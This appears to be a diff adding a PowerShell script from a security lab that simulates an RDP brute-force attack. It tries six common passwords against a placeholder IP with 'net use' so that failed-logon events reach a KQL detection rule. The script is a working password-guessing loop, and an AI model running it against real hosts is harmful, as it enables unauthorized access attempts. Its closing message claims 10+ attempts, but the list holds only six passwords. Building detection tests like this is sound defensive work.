@@ -1,0 +1,23 @@
+<#
+.SYNOPSIS
+    Simulates a Brute-Force RDP attack for detection testing.
+.DESCRIPTION
+    This script attempts to authenticate against a target IP using a list of common passwords.
+    It is designed to trigger Event 4625 in the Windows Security Log.
+#>
+
+$TargetIP = "PASTE_YOUR_SPOKE_VM_IP_HERE"
+$Username = "Admin-Babatunde"
+$Passwords = "Password123", "Admin2026", "Security123!", "LetMeIn", "Azure123", "Winter2026"
+
+Write-Host "Starting Brute-Force Simulation against $TargetIP..." -ForegroundColor Red
+
+foreach ($pass in $Passwords) {
+    Write-Host "Attempting login with password: $pass" -ForegroundColor Yellow
+    # This command attempts a network credential verification to trigger the failure log
+    $cmd = "net use \\$TargetIP\IPC$ /user:$Username $pass 2>&1"
+    Invoke-Expression $cmd | Out-Null
+    Start-Sleep -Seconds 1 # Mimicking automated script timing
+}
+
+Write-Host "Simulation Complete. 10+ failed attempts generated for KQL detection." -ForegroundColor Green
